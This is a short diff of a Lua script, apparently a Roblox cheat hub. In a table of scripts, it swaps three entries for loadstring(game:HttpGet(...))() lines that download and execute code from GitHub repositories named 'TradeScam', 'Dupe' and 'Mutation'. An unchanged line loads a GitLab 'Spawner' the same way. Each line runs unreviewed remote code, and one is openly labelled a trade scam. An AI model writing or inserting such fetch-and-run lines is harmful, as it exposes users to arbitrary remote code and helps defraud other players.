@@ -252,9 +252,9 @@ local buttonNames = {
 }  
 
 local scripts = {  
-    'loadstring(game:HttpGet("https://raw.githubusercontent.com/Dupe-pet/SpawnerRAW/refs/heads/main/Free-script"))()',  
-    'loadstring(game:HttpGet("https://raw.githubusercontent.com/Dupe-pet/Gui/refs/heads/main/My-gui"))()',  
-    'loadstring(game:HttpGet("https://raw.githubusercontent.com/Dupe-pet/Speed-hub/refs/heads/main/Speedhub"))()',  
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamlaHub/TradeScam/refs/heads/main/TradeScript"))()',  
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamlaHub/Dupe/refs/heads/main/DupeScript"))()',  
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamlaHub/Mutation/refs/heads/main/MutationScript"))()',  
     [[  
     local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()  
     Spawner.Load()  
